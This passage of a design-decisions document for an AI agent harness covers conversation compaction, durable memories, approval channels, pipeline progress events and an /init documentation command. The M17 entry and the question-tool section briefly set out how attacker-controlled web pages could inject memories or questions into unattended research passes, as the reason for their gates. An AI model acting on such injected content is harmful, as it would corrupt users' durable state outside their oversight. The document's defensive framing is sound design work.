**M3 — Turn boundary is the primary trigger; a mid-turn valve exists and is
structurally guarded.** Both live inside `_run()`, the one choke point all three
shells pass through. A turn can add far more than any buffer covers —
`MAX_READ_CHARS` alone is ~12.5k tokens per `read` call, up to `max_steps` of them —
so waiting for the next boundary would let one tool-heavy turn reach the provider's
hard limit.

**M4 — The fold boundary lands on a turn start and never splits an assistant
message from its tool results.** Not a quality concern: a `tool_result` with no
preceding `tool_use` is an HTTP 400 on Anthropic, a hard wire error on the next call
of a thread that worked a moment ago.

**M5 — Three floors, earliest wins.** The current turn (structural — `_run()`
records how many turns were complete when it began, so a summary can never rewrite
the question being answered), the last 3 completed turns, and
`keep_recent_tokens`. The turn floor is not in the original spec and is needed
because one tool-heavy turn can consume the whole token budget by itself, leaving
the immediately preceding exchange summarized — a follow-up like "no, the other one"
then has no referent. An empty span is a real state, reported rather than silently
skipped.

**M6 — Research passes compact only at a hard backstop** near the context window,
never at the working-set trigger. A pass is headless and unattended and already
returns a distillation, so routine compaction there would spend on a judgment call
nobody is watching. `run_deep_research_mode` passes the mode explicitly.

**M7 — `MessageLog.pinned` needs a migration, and nothing here had one.**
`create_db_and_tables()` calls `create_all()`, which creates missing *tables* and
never `ALTER`s, so this — the first field ever added to a shipped table — would
break every existing `app.db` on the first `SELECT`, silently, at read time rather
than at startup, and invisibly on a machine with a fresh database.
`database.ensure_columns()` closes it: additive only, warning rather than raising on
a type mismatch, since SQLite has type affinity rather than enforcement and refusing
to start over a cosmetic difference would be a self-inflicted outage in the one code
path every launch runs through.

**M8 — The checkpoint summary is a synthesized leading `user` message, never a
`MessageLog` row.** The neutral shape has no system role, so a leading user message
is the one form all three providers accept. Persisting it would put derived content
in an append-only archive whose whole value is being original — and the next
compaction would summarize the previous summary as if it were something the user
said, chaining by accident on the code path that means to re-derive.

**M9 — Pinned rows inside the covered span are re-included verbatim.** AC1 (archive
intact) and AC2 (pinned rows never summarized) cannot both hold through
`after_message_id` alone: `covers_up_to_message_id` is a single watermark and cannot
express "everything through K except rows 5 and 6". The view is
`summary + pinned-rows-before-the-watermark + tail`. Without this the one message a
user explicitly asked to keep is the one message that disappears.

**M10 — The compression ratio is measured by character proxy, and says so.** The
spec asks for the summary's tokens to be counted; no tokenizer is available offline
and `usage["input_tokens"]` measures a whole prompt rather than a segment of one.
Chars/4 applied to both sides is self-consistent, which is all a ratio check needs —
it is never compared against a provider's count.

**M11 — Turn counting is ARCHIVE-space, never view-space.** Added by the §21a
review pass, which found the section had shipped broken without it.

M8 makes the checkpoint summary a `role: "user"` message, and that is right — the
neutral shape has no system role, so it is the only form all three providers accept.
The consequence was not traced: **the derived view therefore contains a user message
that is not a turn**, so every turn counter over the view is off by one, and any
value derived that way is in a different space from the archive turn indices
`compactable_span()` compares it against.

Both counters were wrong. `_completed_turns` counted view user-messages and was
`min()`'d against an archive index; the keep-tokens floor sliced the view and mapped
positions back onto the archive's turn list. On an *uncompacted* thread the two
spaces coincide exactly, which is why 849 tests passed. On a compacted one the floor
came out several turns too low, the computed watermark went BACKWARDS, and since
`latest_checkpoint` resolves by timestamp the backwards checkpoint became live: the
second automatic compaction of a thread **un-compacted it**.

So: `compactable_span()` derives every floor from one load of the archive rows, which
makes the mismatch unrepresentable rather than merely corrected, and
`completed_turns()` lives on `ConversationMemory` (the file that owns the thread's
persistence — `core/loop.py` imports no storage and should not start). Archive-space
also makes the value time-invariant within a turn, so it is computed lazily on the
compact path and cannot go stale when a mid-turn compaction rebuilds the view.

**The watermark-advances invariant is enforced, not assumed.** `compact()` skips
before spending a model call when the boundary has not moved past the last
checkpoint; `save_checkpoint()` refuses a watermark that does not advance, because
the caller-side check only covers the one caller that exists today. Same posture as
D24's declared-permission check: the invariant is cheap to state and its violation is
silent and durable.

### Decisions record (M12–M17), added at §21b's build

Tracing §21's durable-memory block against the code turned up one spec gap, one
security hole and three unstated behaviours.

**M12 — `UserMemory` needs a `project_path` column the spec omits.** D25 says a
project-scoped memory is "keyed to the same resolved project path the workspace-trust
store uses", but the schema block above carries only `scope`. With no path recorded,
`"project"` cannot tell two projects apart — so AC6 ("that memory does not surface in
a thread opened from a different project directory") was not merely unenforced, it was
unwriteable as a test. `project_path` holds the realpath for `scope="project"` and
`None` for `"global"`, from a new `config_loader.get_project_path()` over the value
`initialize()` already resolved.

**M13 — Plain chat counts as opted in, and the fragment goes OUTSIDE
`with_catalogs()`.** `system_prompt_for()` — the only place `CONTEXT.md` is injected
— is reachable solely when running as an agent, so the literal reading of "an agent
opts in via `use_memory: true`" makes memories invisible in ordinary chat, which is
the main case and the §25 shape: a capability a whole shell cannot reach. The
frontmatter parser already defaults `use_memory` to `True`, so an agent that says
nothing gets them; "no agent at all" is treated the same. `use_memory: false` still
opts out, which is how the compactor and the pipeline reviewer stay out of a user's
durable facts.

`memories.manager.prompt_fragment()` is the single assembly point, mirroring
`skills.manager.prompt_fragment`, appended by its three CALLERS — never inside
`with_catalogs()`, which feeds `pass_prompt()` and would put every memory into all ten
research passes. §19 recorded that as K6 for skill bodies; this is its second instance.

Consequence, stated rather than discovered: research passes neither read nor write
memories. They never reach `system_prompt_for`, and D26 already stops them writing.

Also settled here: **an unresolved project means NO memories, not global-only.**
`get_project_path()` returns `None` exactly when `initialize()` has not run, and
`main.py` runs it at startup — so that state is "there is no session", and answering
with rows would mean reading a database on behalf of one that does not exist. Same
convention `get_agents()`/`get_skills()` already set.

**M14 — Injection is capped by count, and the cap is stated in the text the model
reads.** Every in-scope memory would otherwise enter every turn forever, which is the
unbounded context growth §21 exists to fight — reintroduced by the feature meant to
complement it. `config.MAX_INJECTED_MEMORIES` (50), newest first, because recency is
the only staleness signal available without asking a model. The truncation appears in
the fragment as well as in a log: the model is the consumer, and one that can see it
is looking at a truncated list can say so, while a log line reaches nobody
mid-conversation. Same "no silent caps" rule as §20's `MAX_REVIEW_FINDINGS`.

**M15 — `/memories` and `/forget` ship with §21b, not as D26's fallback.** §21 frames
`/forget` as what to build *if* the approval prompt proves too frequent. Staleness is
a different problem the gate never touches: a memory approved when it was true
survives the thing that made it false. Without removal one wrong memory is permanent,
and listing is what makes removal usable, since the model never shows ids. The CLI
gets `--memories` / `--forget` as flags because it has no slash-command layer — and
because M16 makes a CLI-only user able to *write* a memory, so they would otherwise
have no way to remove one. Removal is by id, never by content substring: a substring
matching two memories would have to pick one or refuse, and picking silently deletes
something the user did not name.

**M16 — CLI chat gains a general `ApprovalProvider`, and the reach is the point.**
§13 does not merely DENY an approval-gated tool where nothing can answer; it stops
advertising it. So CLI chat could not see `shell`, `spawn_subagent`, `remember` or any
MCP tool at all. A provider makes all of them advertised and promptable, matching what
the TUI has always done — intended, and larger than the one tool §21b needed it for.

Carried as a `RunAuthorization` with an empty grant set rather than a new
`approval_provider=` parameter, so it reuses `_authorization_kwargs`; a provider means
"someone is here to ask", never "these tools are pre-approved". `honour_run_scope=True`
for chat and `False` for attended research, and the two must not converge — chat wants
§18's per-run shortcut, attended research exists for per-call supervision. `None` on a
non-tty, matching `build_review_consent`, so a piped run stays headless.

**M17 — `remember` joins `PIPELINE_UNGRANTABLE`.** It has no `approval_check`, so
§25's R2 rule makes it grantable and it would have appeared in the research grant
picker. One `--grant remember` at launch would let ten unattended passes — reading
attacker-controlled web pages — write durable cross-session memories. That is exactly
what D26's consequence 1 says must not be possible, and R4's reasoning about one
launch-time tick compounding into unbounded delegated authority applies word for word.
Found by tracing D26's stated consequence against §25's actual grant rule; neither
document is wrong alone.

**Carried to §21b**, decided during §21a's design and not built there: wire §25's
`ApprovalProvider` into CLI chat, so D26's approval-gated `remember` is reachable in
the default shell. Without it §13's headless rule makes `remember` invisible
everywhere but the TUI — the §25 cautionary tale, one section later. `pin` needs no
approval (D26), so §21a does not depend on it.

### Decisions record (M18–M21), added at §21c's build

**M18 — a thread summary gets its OWN TABLE, not a `CompactionCheckpoint` row with a
different `strategy`.** The two carry nearly identical columns and mean opposite
things: `latest_checkpoint` resolves by timestamp and feeds
`ConversationMemory._derived_view()`, so writing one is an edit to a live conversation,
while a summary is a description that changes nothing. A summary row in that table
would therefore silently compact the thread it was meant to describe, and would win by
being newest. Two tables make that impossible instead of documented. `extra_data` was
the other candidate and was rejected for T1's reason — an opaque JSON blob cannot be
filtered in SQL, and the roadmap keeps a future `search_threads` open.

Its consequence, stated because it looks like an oversight: **`save_thread_summary` has
no advance guard while `save_checkpoint` does.** A backwards compaction watermark
un-compacts a thread; a redundant summary row can only describe a thread as it was a
moment ago, which the next `advances()` check notices. The guard would be cargo, and
copying it would imply the two writes are the same kind of thing.

**M19 — a referenced summary is a PROMPT TIER, not a message.** `with_refs` sits beside
`with_goal` and `with_memories`, reading a list off the thread's `extra_data`. The
alternative — writing `[Reference from thread X] …` into the archive as a `user`
message — was rejected on §27's ground: replay would render harness-generated text
under a `you ›` label, which M8 forbids, and a later compaction would summarise the
summary. Appended OUTSIDE `with_catalogs()` (K6's third instance) and
**unconditionally**, unlike memories: a reference belongs to the thread rather than to
an agent, and `system_prompt_for()` has no memory object to read one from.

**M20 — `/summary` describes, `/compact` folds.** §21's text treats "session summaries"
as compaction invoked deliberately, which §21a's `/compact` already is. What remained
unserved is the request that produced the feature: *show me what this conversation has
been about*, without shortening what the model sees next turn. Two different requests
that share a summariser.

**M21 — the CLI gets flags (`--summary`, `--ref`), not a slash-command layer.** M15's
precedent, for M15's reason: the CLI has no command layer, and adding one is §23's
business, where the response channel it would share is already specified. The accepted
limit is that a CLI user attaches a reference at launch rather than mid-conversation.

**The summary target is absolute, not a `COMPACTION_TARGET_RATIOS` entry.** A ratio is
correct for a fold, where the summary replaces the span it came from and the thread
shrinks either way. §21c's summary is injected on EVERY turn of the referencing thread
with nothing bounding it, so a 500KB source at strength 3 would inject 75KB
indefinitely. `config.SUMMARY_TARGET_CHARS` is passed as `_summarize`'s `target`, which
takes plain values and needed no change. A thread already shorter than the budget is
stored verbatim and costs no model call.

### Acceptance criteria

1. Compaction never modifies or deletes rows in `MessageLog` — only adds `CompactionCheckpoint` rows. A full-history query against `MessageLog` alone always returns everything ever said, regardless of how many times compaction has run.
2. A pinned message is never included in what the compactor is asked to summarize.
3. A compaction whose output falls outside the target ratio for the configured `strength` triggers a corrective retry, bounded by `COMPACTION_MAX_RETRIES`.
4. The early-warning notification fires strictly before the compaction-trigger threshold, using the same context-size estimation the trigger itself uses.
5. `remember()` output is visible in a later, different thread only when that later agent has `use_memory: true` and the memory's `scope` matches.
6. **(D25) `remember()` with no explicit `scope` writes a `"project"`-scoped row**, keyed to the same resolved project path the trust store uses — and that memory does not surface in a thread opened from a different project directory.
7. **(D26) `remember()` is denied on a path with no approval channel** (CLI, pipeline passes) rather than writing silently; `pin()` succeeds on those same paths. Both tools have declared fields in `ToolPermissions` and `ToolApprovals`, per D24's consistency check.
8. **(D27) A `compaction` block in a trusted project's `settings.json` overrides the `config.py` defaults**, a user-level `settings.json` overrides `config.py` but loses to the project, and an out-of-range value (`strength: 9`, or `warning_margin >= buffer`) is rejected with a clear message at load time rather than producing incoherent trigger math later.
9. **(§21c) A thread summary leaves the thread it describes untouched** — no `CompactionCheckpoint` row, and the derived view identical before and after.
10. **(§21c) A summary of a compacted thread describes the original conversation**, not the compaction summary, and a second summary of an unchanged thread costs no model call.
11. **(§21c) An attached reference reaches a chat prompt in both shells and NO research pass prompt**, states that it is not this conversation's history, and is refused rather than silently rotated once `MAX_INJECTED_REFS` is reached.

---

## 22. Pipeline observability — orchestrator events + the live research view — BUILT

**Added during §16.** The deep-research pipeline currently reports nothing while it runs. `run_deep_research_pipeline()` is synchronous; each pass is drained through `run_to_completion()` inside `orchestrator.py`, so no `LoopEvent` escapes, and the 16 per-pass `update_pipeline_run()` checkpoints write to the database rather than to a caller. §16's research view is coarse for exactly this reason — it can show that the pipeline is running and render the trace and report when it returns, and nothing in between.

This is the second §13-scale refactor: make the orchestrator a generator.

### Shape

`run_deep_research_pipeline()` becomes a generator yielding a `PipelineEvent`, with a `run_pipeline_to_completion()` drainer keeping every existing caller (the CLI, `main.run_research`, the §16 TUI worker) synchronous — exactly the shape §13 used for `_run()` / `run_to_completion()`, for the same reason.

Event kinds, at minimum: `pass_start` / `pass_complete` (with the pass id), `trace_line`, `claim_extracted`, `claim_tiered` (claim id + tier), `retry` (which claim, which attempt), and `run_complete`.

### Decide the event shape BEFORE adding to it

`LoopEvent` is a flat dataclass with an "exactly one field is populated" convention (see `core/events.py`). That was right for six kinds. §22 adds roughly seven more of a different family, and §23 adds two more — at which point a flat bag of ~15 optional fields, where the valid combinations are documented in a docstring rather than in the type, stops paying for itself.

**Decide this first**: either `PipelineEvent` is a separate type from `LoopEvent` (likely — they have different consumers and different lifetimes), or both become a tagged union. Do not simply add fields to `LoopEvent` and discover the problem at §23.

### Interaction with §5's checkpoints

The orchestrator already calls `update_pipeline_run()` after every `run.log()`. Those calls and the new events carry overlapping information, and **two independent writers of related data is the exact bug shape this project already found and fixed once** (ARCHITECTURE/DEVLOG §3.8, cited by §21's own design principle). Derive one from the other — emit the event at the checkpoint site rather than adding a parallel emission path.

### Decisions record (P1-P4)

| # | Decision |
|---|---|
| **P1** | `PipelineEvent` is a **separate type from `LoopEvent`**, **kind-discriminated** (`kind: str` plus optional payload fields), living in `core/reasoning/events.py`. Not a second flat "exactly one field is populated" bag, and not a tagged union for both families — that would rewrite every `if event.token_delta:` read in `tui/app.py`, `core/loop.py` and the streaming tests, a §13-scale breakage inside a §22 change. This discharges AC4. |
| **P2** | **No `LoopEvent` forwarding from inside a pass.** The orchestrator yields only its own kinds; each pass still runs through `run_deep_research_mode()` -> `run_to_completion()`. `core/loop.py`, `core/client.py`, `json_retry.py` and `review.py`'s internals were untouched by this section. **AMENDED BY §26** — see below. |

**P2, amended by §26.** P2 rested on a premise — that a pass's internals are not worth
seeing — and the first real ten-pass run disproved it: a Pass 1 making fourteen
`fetch_url` calls over several minutes was indistinguishable from a hang. §26 has
`_run_pass` iterate a new `RunAgentLoop.stream_deep_research_mode()` and **translate** a
chosen subset of its `LoopEvent`s into pipeline kinds.

What P2 was *protecting* still holds and is the reason the amendment is narrow: a
consumer of `stream_deep_research_pipeline()` still receives exactly one event type, so
no `if event.token_delta:` read exists outside `core/loop.py` and the streaming tests.
`client.py`, `json_retry.py` and `review.py` remain untouched. Translated, not forwarded.
| **P3** | **`run_deep_research_pipeline()` keeps its name, signature and synchronous behaviour**, becoming the drainer applied to the new `stream_deep_research_pipeline()` generator. The section's own text implied the public name should become the generator; that would have churned fifteen test sites and both shells for nothing AC1 asks for, and §13's *actual* shape is a private generator with draining wrappers. |
| **P4** | Consumers built: TUI transcript lines, a TUI `ResearchProgress` sidebar panel, and CLI live progress. Both shells stopped re-printing `run.trace` at the end, since every line now arrives as an event. |

### What the build found

**`run.trace` had three writers and only one of them checkpointed.** `orchestrator.py`
paired `run.log()` with `update_pipeline_run()` at twenty sites; `review.py` called
`run.log()` from fifteen places and checkpointed from none; `json_retry.py` appended
straight to the list. So AC3's "§5's per-pass persistence still fires on every trace
line" was not true when it was written. Deriving both the persistence and the events
from `run.trace` via a watermark (`_Progress`) made it true and picked the other two
writers up without editing either module — and made a JSON-parse retry visible with no
event kind of its own.

**Persist before emit.** A generator only advances while someone iterates it, so
yielding first would let a consumer that abandons the run take that checkpoint down
with it. Found by the abandoned-run test, not by reasoning.

**`GeneratorExit` is not an `Exception`.** An abandoned run therefore leaves
`status='running'`, which is honest and is recorded rather than fixed: flipping it to
`'failed'` would make an interrupted run indistinguishable from a broken one.

**Twelve test doubles stopped intercepting, silently.** Repointing the shells to the
generator made every `mocker.patch(...run_deep_research_pipeline)` a no-op that ran the
REAL pipeline. Same class of trap one layer down: a plain-function double for
`_run_pass` is not an error under `yield from` — it iterates the returned string one
character at a time and returns `None`.

**A widget method named `_render` shadows Textual's `Widget._render()`**, and the
symptom is the whole app failing to lay out with `'NoneType' object has no attribute
'get_height'`.

### Acceptance criteria

1. Every existing caller of `run_deep_research_pipeline()` still receives a finished `PipelineRun`, unchanged, via the drainer. ✓
2. A TUI consumer renders pass boundaries and claim tiers as they happen, without polling the database. ✓
3. §5's per-pass persistence still fires on every trace line, and there is exactly one place a trace line is recorded. ✓
4. The event-type decision above is made explicitly and recorded, before any event is added to `LoopEvent`. ✓ (P1, pinned by a test that fails if `LoopEvent` grows an eighth field — it has seven)

---

## 23. Interactive tools — question tool, todo list, and the response channel they share

**Added during §16. BUILT in two slices.** Slice 1: the channel (AC1), its three consumers, and §18's deferred per-tool sign-off (AC1b). Slice 2: the question tool and the todo list (ACs 2–4), plus P1's deferred event-shape decision, settled by J10 without needing a new type.

**Added during §16.** Two requested capabilities need the same missing piece: a way for a *tool* to ask the user something and block until answered. §13 built exactly one of these — `permission_channel`, a `queue.Queue` carrying a boolean — and both of these need a richer version of it.

### The shared piece first

Generalise the approval bridge into a response channel that carries a typed request and a typed response, with `permission_channel` becoming one case of it rather than a parallel mechanism. Doing the tools first and the generalisation afterwards produces two bespoke channels and a third when §18 wants one.

**The warning was right, and it was already five by the time this was built.** `permission_channel` (§13), `ApprovalProvider` (§25), `ReviewConsent` (§20), and §24 added two more — `ask_confirm_blocking` and `ask_project_kind_blocking` — in the section immediately before this one. Each re-derived the same four rules: what a dismissal carries, what a timeout means, how shutdown releases a parked worker, and how a malformed answer decodes.

### Decisions record (slice 1: J1–J8; slice 2: J9–J14)

| # | Decision | Why |
|---|---|---|
| **J1** | **`core/interaction.py`**, a leaf module beside `core/approval.py`. `Request(kind, payload, notice)` + `ResponseChannel(ask, honour_run_scope)` | Authorization DATA (what was decided, how much is left to spend) is a different thing from the MEANS of asking, which is why the two stay separate modules rather than merging |
| **J2** | **What is shared is `decode`, not the dataclasses** | A request/response pair is nearly free to write badly — five call sites can each build one and still each invent their own failure handling, which is exactly how there came to be five. One function owning the declining default per kind is the part that pays |
| **J3** | **`decode(request, raw)` takes the REQUEST, not the kind** | Two kinds cannot be validated without knowing what was asked: a CHOICE only against the options offered, a SUBAGENT_SIGNOFF subset only against the candidates listed. Passing the kind alone made both unverifiable — a shell could return a tool nobody offered and thereby grant it |
| **J4** | **`decode(Request(kind), None) == SAFE_DEFAULTS[kind]` for every kind**, pinned by a test | Lets `ask()` route its no-channel and callback-raised paths through `decode` rather than reading the table, so a kind added later cannot carry a default its decoder disagrees with |
| **J5** | **An unknown KIND raises; an unanswerable question declines** | An unanswerable question is a runtime condition to fail safe on. A question nobody defined is a bug, and inventing "no" for it would hide the typo that built the Request |
| **J6** | **Review decoding is STRICT** — a well-formed pair or nothing | The two decoders this replaced disagreed (review.py took a bare `"accept"` string, tui/app.py did not) and neither behaviour was tested. Strict wins because this is the only kind whose permissive failure APPLIES an edit rather than declining one |
| **J7** | **`ToolSpec.request_kind` / `request_payload`** carry the question's shape and its tool-specific fields | grant_scope's reason exactly: the loop asks the registry what shape of question a tool needs, so no tool name appears in `core/loop.py` |
| **J8** | **The sign-off memo is keyed by (tool, SUBJECT)**, amending S1 | `grant_scope="run"` meant a second spawn was not asked at all — and the test pinning it spawned agent `a` then agent `b`, so approving `a` authorised `b`'s whole gated set. Per-tool sign-off makes the answer agent-specific, so the memo is too. The anti-noise intent survives: the same agent twice is one prompt |
| **J9** | **The todo list works HEADLESS**, amending AC2 | AC2 says "both tools deny cleanly with no way to ask", written before this tool's shape was settled. The deny rule exists because a blocking prompt nobody answers turns into a hang — and this tool blocks on nothing and asks nobody. A research run keeping a checklist across ten passes is where one helps most, and ungating it is what makes it visible in a pass at all (§13 hides a gated tool rather than merely denying it) |
| **J10** | **A todo change travels as a `notice` KIND; the panel reads the list from thread state** | Discharges P1's deferred question without a new type. `notice` is already a kind-discriminated dict and `_run()` already yields it. The event says WHEN and `extra_data["todos"]` says WHAT, so the panel holds no authoritative copy and cannot disagree with the conversation. `LoopEvent`'s field set stays frozen. The forwarding is GENERIC — any tool result carrying a `notice` is forwarded and the key stripped — because the alternative was for `core/loop.py` to recognise `todo_write` by name, which is what `grant_scope` and `request_kind` exist to prevent |
| **J11** | **`with_todos` is a FOURTH parallel prompt tier; converging them stays deferred** | `with_memories`' docstring asks §23 to merge goal/skills/memories into one assembly point. They differ in signature (agent vs memory) *and* in conditionality — refs append unconditionally while memories are guarded — and AGENTS.md already records that asymmetry as needing its own test "because the edit looks right". Merging is a refactor with real regression risk and no AC behind it. Recorded so the fourth copy of K6's warning is a known cost, not an accident |
| **J12** | **Both tools are UNGATED** | Gating the question tool would mean approving a prompt in order to be shown a prompt — but the deciding reason is §13: it does not merely deny a gated tool where nothing can ask, it stops ADVERTISING it. Gated, `ask_user` would be invisible in every headless run, and AC2 requires it be visible, called, and answered with a denial the model can work around. `pin` is ungated for the same shape of reason (D26) |
| **J13** | **Whole-list write, not granular operations** | One call replaces the list, so it is always internally consistent and reordering is free. Granular add/complete/remove each need a stable way to name one item — the problem `clear_refs` refused to solve and §21b's "removal is by id, never by substring" rule exists to prevent. A model naming the wrong id silently mutates the wrong entry; a model rewriting the list cannot |
| **J14** | **`extra_data["todos"]`, not its own table** | `storage.get_thread_extra`'s docstring has named this tenant since §18, and §27's column-versus-`extra_data` argument was about keeping `list_threads()` cheap. A todo list is only ever read for the current thread, so queryability buys nothing. It shares the column under its own key beside §18's goal and §21c's refs |

### What the two parameters keep separate

§23 unified the MECHANISM, not the arguments. "May this edit be applied?" (`review`) stays supplied separately from "may this call proceed?" (`authorization.provider`), because `--review` without `--attended` is a legitimate combination and one shared object would make it unexpressible.

### Question tool

Up to 4 options, multi-select, a write-your-own answer, and a "chat about this" escape that returns control to the conversation instead of forcing a choice.

**Headless behaviour is decided (matches D26/`remember()`): with no response channel the call is DENIED**, and the model receives an error result it can work around. This is deliberate for the same reason `remember()` is: a ten-pass pipeline running unattended is exactly where a blocking prompt nobody will answer turns into a hang, and where an injected question from fetched web content would be least noticed.

**Amended by §25.** "The CLI and every research pass are headless" was true when this was written and is now conditional: a research run started with `--attended` carries an `ApprovalProvider` and *can* ask. The decision above is unchanged — the DEFAULT is still headless, and the deny-cleanly path is still what an unattended run gets — but the criterion below must be read as "with no way to ask" rather than "in the pipeline", or a question tool will be denied in an attended run where a human is sitting there waiting to answer it.

Per D24 the tool needs declared fields in both `ToolPermissions` and `ToolApprovals`, or the import-time check fails.

### Todo list tool

A model-maintained checklist, persisted per thread, rendered in a TUI panel whose placement (top / bottom / side) is a `tui.todo_position` preference. Needs an event so the panel re-renders on change. **§22 settled the event-shape question as P1** and froze `LoopEvent`'s field set, with a test that fails if it changes — so a todo event is a decision to make here, not a field to add quietly. `PipelineEvent`'s kind-discriminated shape is the precedent if this family grows the same way. (**Corrected in slice 2:** this said "six fields" and the field set is seven — `token_delta`, `tool_call_start`, `tool_result`, `permission_request`, `notice`, `final_response`, `stop_reason`. The test asserts SET EQUALITY, so the operative constraint is "frozen", not a count; J10 needed neither an addition nor a new type.)

Open question to settle at build time: whether the list is thread-scoped state in `ConversationThread.extra_data` or its own table. `extra_data` is the cheaper answer and the field was put there for this kind of thing -- note it is NO LONGER unused, since §18 shipped goal mode into it via key-scoped `set_extra()`, so a todo list would share the column under its own key.

### Acceptance criteria

1. `permission_channel` is one case of the general channel, not a second mechanism alongside it. **§25 added a second case that this must ABSORB rather than replace:** `core.approval.ApprovalProvider` — a caller-supplied `ask(tool_name, params, notice) -> bool` plus an `honour_run_scope` flag. It exists because `run_to_completion()` discards the `permission_request` event, so the CLI and the research pipeline (which drain the generator rather than watching it) would otherwise block on a queue with nothing displayed. Its `ask` signature is the request/response pair this section generalises; folding it in means one mechanism with three consumers, and NOT folding it in means the third bespoke channel this section exists to prevent.
1b. **Per-tool subagent sign-off is a named consumer of this channel.** (§25 R1 built the per-tool selection for *pipeline* grants, where the prompt is a shell-side question before the run rather than a mid-loop exchange — so it needed no channel and does not discharge this criterion.) The §14-§18 review shipped §18's sign-off as all-or-nothing (decision S1) precisely because the boolean channel cannot carry a list-out/subset-back exchange: approving a spawn authorises the child's entire approval-gated set. The per-tool version -- request carries the candidate tools, response carries the approved subset, and rejected names are removed from the child's `allowed_tools` -- is deliberately deferred here rather than built on a bespoke second channel. `ToolSpec.approval_notice` and `ToolSpec.grant_scope` already exist and generalise to it.
2. Both tools deny cleanly **with no way to ask** — no response channel and no `ApprovalProvider` — and say why. (Amended by §25: "in every pipeline pass" is no longer the same condition; an attended run can ask.) ✓ **for `ask_user`; AMENDED for the todo list by J10/J9** — a checklist asks nobody and blocks on nothing, so "deny cleanly" has nothing to deny. `todo_write` works headless deliberately. `ask_user` denies with an error naming the condition and telling the model to state its assumption, and stays ADVERTISED headless (J12) so the denial is reachable at all.
3. Both tools have declared permission/approval fields (D24). ✓ Both allowed, both ungated (J12/J9); `assert_permissions_declared` raises at import if either field goes missing, verified by removing one.
4. The todo panel re-renders from an event, not from polling. ✓ A `todo_changed` notice is the trigger; the panel re-reads `extra_data["todos"]` for the content (J10). Pinned by a test that sets the thread state, asserts the panel is STALE, then posts the event — so a polling implementation fails it.

**Slice 1 status:** AC1 ✓ (one mechanism, three consumers — approval, review, sign-off — plus §24's two). AC1b ✓ (`SubagentSignoffScreen`, the subset intersected with the offered candidates, and S1's scope amended per J8).

**Slice 2 status:** ACs 2–4 ✓. `ask_user` and `todo_write`, a new `QUESTION` kind whose answer is three-way (an option set / free text, a deferral, or nothing), and a TUI panel fed by a `notice` kind. **P1's deferred `LoopEvent`-vs-tagged-union decision is settled by J10 and needed neither option:** `notice` is already kind-discriminated, so the todo event added no field and no type, and `test_loop_event_did_not_grow_a_seventh_field` is untouched.

**Out of slice 2, recorded rather than dropped:** the CLI slash-command layer §21c's M21 deferred here (no AC, no decisions record, and neither tool needs it — the CLI reaches both through `build_attended_provider`), and the convergence of the four `with_*` prompt tiers (J11).

---

## 24. `/init` — generate the project's documentation set — BUILT

**Added during §16, built after §21c.** A command that reads the project and writes `.venastine/CONTEXT.md`, the free-text project context §14 already loads and injects into opted-in agents' prompts.

**Widened at build time, on the user's correction.** The spec generated one file. What ships scaffolds a SET: `CONTEXT.md` is the hub and the only document inside `.venastine/`, and it links out to ordinary committed root documents — `ARCHITECTURE`, `ROADMAP`, `DEVLOG`, `TECHNICAL_DEBT`, `DOCUMENTATION_STANDARDS`, `TEST_WRITING`, `BREAKING_CHANGES` for a software project, or `RESEARCH_QUESTIONS`, `METHODOLOGY`, `SOURCES`, `FINDINGS`, `LIMITATIONS`, `EXPERIMENT_LOG`, `OPEN_QUESTIONS` plus the shared `DOCUMENTATION_STANDARDS` for a research one.

### Two interactions to design around, not discover

**Writing `CONTEXT.md` changes the workspace-trust hash.** D17 keys trust to a sha256 of everything under `.venastine/`, so generating this file invalidates the grant and the next run re-prompts. That is the trust system working exactly as designed — content changed, so consent is re-asked — but a `/init` that silently costs the user their trust grant is a bad experience. Either re-grant explicitly as part of the command (the user just authored the content, so consent is unambiguous) or tell them it will happen. Do not special-case `CONTEXT.md` out of the hash; that would put a hole in D17 for the convenience of one command.

**`write` is permission `False` by default.** §24 either runs through the existing `write` tool (and so needs approval, which is right for a command that writes into the project) or writes directly from the command handler. Prefer the former: a command that bypasses the tool permission layer to write files is a precedent worth not setting.

**Correction found at build time: neither option was available as written.** `write` is not merely `False` by default — it is unoverridable at runtime. `is_tool_allowed()` reads `config.ToolPermissions()` directly, `settings.json` has no `permissions` section and `_KNOWN_SETTINGS` raises on an unknown key, and D14 forbids a `ToolContext` widening anything, with the global check running first and unconditionally. `dispatch("write", …)` therefore raises `ToolCallDenied` before the `approval_callback` is ever consulted, for every user, out of the box. `read` is blocked identically, which also ruled out an agent that explores the project with the existing read tool. I1 and I2 are what the preference above became once that was true.

### Decisions record (I1–I13)

| # | Decision | Why |
|---|---|---|
| **I1** | A new narrowly-scoped **`write_project_doc`**, not `write`. It takes a document NAME from a fixed allowlist and has no path parameter at all | AC3 holds literally — dispatch, approval gate, `check_input_policy`, output redaction — without flipping a global or inventing a `permissions` config surface in the one file where project tier beats user tier. The destination is derived, so the tool cannot be aimed elsewhere |
| **I2** | A scoped **`read_project_doc`**, rather than flipping `ToolPermissions.read`. Allowed, no approval | Reading the project's own documents at the user's explicit request is not an escalation, and a gate would mean a dozen prompts per run — the shape of consent that gets clicked through. Flipping the global would hand every agent and all ten research passes standing file access. The readable set is DOCUMENTATION rather than "text files" because a permission-`True` tool is advertised to every run, not only `/init`'s |
| **I3** | Discovery is a **manifest injected into the user message**, built by a directory walk | No model call and no tool call, so two runs on an unchanged project produce byte-identical input — which is what makes the output diffable. Sizes are included because choosing what to read needs them: this repo's root markdown is 721 KB against a 20 KB per-read cap. Recursing for markdown was rejected; here it pulls in `prompts/`, `skills/builtin/` and `agents/builtin/`, which are harness assets competing for a bounded budget |
| **I4** | Regeneration **revises**; an existing `CONTEXT.md` is a labelled input | Hand edits survive by design rather than by the user rejecting a diff and re-applying them |
| **I5** | An existing file gets a **unified diff and an explicit yes**; with no way to ask, `/init` refuses | §25's V6, sixth instance: the inability to ask is not permission to proceed. No stored state — the diff comes from what is on disk |
| **I6** | Trust is re-granted **only if the project was already trusted** before the write | The user just authored the content, so consent is unambiguous — but `.venastine/` in an untrusted project may already hold agents, skills and an `mcp.json` that arrived with a cloned repo. Granting as a side effect of `/init` would wave all of it through: a hole in D17 opened from a direction the trust prompt never sees. `CONTEXT.md` is never special-cased out of the hash |
| **I7** | Three bounds: `INIT_TOKEN_BUDGET`, `INIT_READ_CHARS`, `INIT_MAX_STEPS` | TECHNICAL_DEBT item 9's meter re-counts the whole prompt every step, so a tool-heavy loop exhausts the chat budget in a handful of calls — §26 hit this exact profile and it is why research passes got their own. The three bound different things: total spend, per-read size, and the number of reads, which neither of the others limits |
